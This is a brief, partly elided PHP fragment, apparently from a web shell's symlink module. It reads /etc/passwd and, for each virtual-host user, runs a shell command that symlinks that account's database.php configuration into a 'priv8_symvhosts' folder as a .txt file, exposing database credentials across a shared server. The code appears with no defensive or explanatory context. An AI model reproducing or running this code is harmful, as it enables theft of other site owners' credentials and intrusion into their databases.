...
", $etc_passwd);
        foreach ($etc_passwd as $passwd) {
            ...
            if (preg_match('/vhosts/i', $user)) {
                ...
                exe("ln -s " . $user . "/httpdocs/application/config/database.php priv8_symvhosts/" . $jembod . "-Ellislab.txt");
            }
        }
    }
